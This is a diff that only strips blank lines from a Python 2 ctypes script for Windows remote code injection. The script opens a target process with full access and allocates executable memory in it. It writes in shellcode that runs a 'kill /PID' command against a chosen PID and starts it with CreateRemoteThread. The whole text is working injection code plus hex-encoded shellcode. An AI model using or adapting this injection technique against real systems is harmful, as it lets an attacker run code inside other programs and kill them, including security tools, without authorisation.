@@ -1,7 +1,6 @@
 import sys
 from ctypes import *
 
-
 PAGE_EXECUTE_READWRITE = 0x00000040
 PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF )
 VIRTUAL_MEM = ( 0x1000 | 0x2000 )
@@ -29,41 +28,28 @@ shellcode = \
 "\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41\x41\x41\x41\x00"
 
 padding = 4 - (len(pid_to_kill))
-
 replace_value = pid_to_kill + ( "\x00" * padding)
-
 replace_string = "\x41" *4
-
 shellcode  = shellcode.replace(replace_string, replace_value)
-
 code_size = len(shellcode)
-
 h_process =kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(pid))
 
 if not h_process:
-
     print "[*] Couldn't acquire a handle to PID: %s" % pid
     sys.exit(0)
 
 arg_address =kernel32.VirtualAllocEx(h_process,0,code_size, \
                                      VIRTUAL_MEM , PAGE_EXECUTE_READWRITE)
 
-
-
 written = c_int(0)
-
 kernel32.WriteProcessMemory(h_process,arg_address,shellcode,\
                             code_size,byref(written))
 
-
 thread_id = c_ulong(0)
-
 if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,\
                                     None,0,byref(thread_id)):
     print "[*] Failed to inject process-killing shellcode. Exiting."
     sys.exit(0)
 
-
 print "[*] Remote thread created with a thread ID of : 0x%08x" % thread_id.value
-
 print "[*] Process %s should not be running anymore!" % pid_to_kill
